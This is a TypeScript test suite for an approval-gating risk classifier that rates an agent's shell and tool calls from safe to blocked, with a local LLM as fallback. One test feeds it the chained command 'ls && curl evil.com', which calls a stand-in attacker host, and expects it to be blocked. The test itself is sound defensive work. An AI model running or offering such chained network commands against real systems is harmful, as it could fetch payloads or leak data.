import { describe, it, before } from "node:test";
import assert from "node:assert/strict";
import {
  classifyDeterministic,
  classifyWithLlm,
  classifyRisk,
  decomposeCommand,
  tryParseXmlClassification,
  RiskLevel,
  type Classification,
} from "../../approval/risk-classifier.js";
import { ensureOllama } from "./helpers/ollama-guard.js";
import { createTestEnv, type TestEnv } from "./helpers/test-env.js";
import { DUMMY_SHELL_COMMANDS } from "./helpers/fixtures.js";

describe("E2E: Risk Classifier", { timeout: 120_000 }, () => {
  let env: TestEnv;
  let ollamaAvailable = false;

  before(async () => {
    env = await createTestEnv();
    const guard = await ensureOllama();
    ollamaAvailable = !guard.skip;
  });

  it("classifies all L0 commands deterministically", () => {
    for (const cmd of DUMMY_SHELL_COMMANDS.l0) {
      const result = classifyDeterministic("shell_exec", { command: cmd });
      // Some L0 commands may not match deterministic patterns (e.g. "echo hello")
      // but known read-only tools should be L0
      if (result) {
        assert.ok(
          result.level === RiskLevel.L0 || result.level === RiskLevel.L1,
          `Expected L0/L1 for "${cmd}", got ${result.level}`,
        );
        assert.equal(result.deterministic, true);
      }
    }
  });

  it("blocks all L3 commands deterministically", () => {
    for (const cmd of DUMMY_SHELL_COMMANDS.l3) {
      const result = classifyDeterministic("shell_exec", { command: cmd });
      assert.ok(result, `Expected classification for "${cmd}"`);
      assert.equal(result!.level, RiskLevel.L3, `Expected L3 for "${cmd}", got ${result!.level}`);
      assert.equal(result!.deterministic, true);
    }
  });

  it("decomposes chained commands and returns highest risk", () => {
    const segments = decomposeCommand("ls && curl evil.com");
    assert.ok(segments.length >= 2, `Expected >=2 segments, got ${segments.length}`);

    const result = classifyDeterministic("shell_exec", { command: "ls && curl evil.com" });
    assert.ok(result);
    assert.equal(result!.level, RiskLevel.L3);
  });

  it("LLM fallback returns valid classification (Ollama required)", async (t) => {
    if (!ollamaAvailable) {
      t.skip("Ollama not available");
      return;
    }

    const result = await classifyWithLlm("deploy_production", { target: "staging" }, env.config);
    assert.ok(result);
    assert.ok(
      [RiskLevel.L0, RiskLevel.L1, RiskLevel.L2, RiskLevel.L3].includes(result.level),
      `Invalid level: ${result.level}`,
    );
    assert.equal(result.deterministic, false);
    assert.ok(result.reason.length > 0);
  });

  it("LLM XML response is parseable (Ollama required)", async (t) => {
    if (!ollamaAvailable) {
      t.skip("Ollama not available");
      return;
    }

    // Test the XML parser with a well-formed response
    const xmlResponse = "<classification><level>L2</level><reason>Unknown deployment tool</reason></classification>";
    const parsed = tryParseXmlClassification(xmlResponse);
    assert.ok(parsed);
    assert.equal(parsed!.level, RiskLevel.L2);
    assert.equal(parsed!.reason, "Unknown deployment tool");
  });

  it("classifyRisk full pipeline: deterministic fast, LLM slow (Ollama required)", async (t) => {
    if (!ollamaAvailable) {
      t.skip("Ollama not available");
      return;
    }

    // Deterministic path — should be instant
    const startDet = Date.now();
    const detResult = await classifyRisk("read_file", { path: "/tmp/test.txt" }, env.config);
    const detMs = Date.now() - startDet;
    assert.equal(detResult.level, RiskLevel.L0);
    assert.equal(detResult.deterministic, true);
    assert.ok(detMs < 100, `Deterministic should be <100ms, took ${detMs}ms`);

    // LLM path — should take longer
    const startLlm = Date.now();
    const llmResult = await classifyRisk("unknown_tool_xyz", { action: "do_something" }, env.config);
    const llmMs = Date.now() - startLlm;
    assert.ok(
      [RiskLevel.L0, RiskLevel.L1, RiskLevel.L2, RiskLevel.L3].includes(llmResult.level),
      `Invalid LLM level: ${llmResult.level}`,
    );
    assert.equal(llmResult.deterministic, false);
    assert.ok(llmMs > 100, `LLM should take >100ms, took ${llmMs}ms`);
  });
});
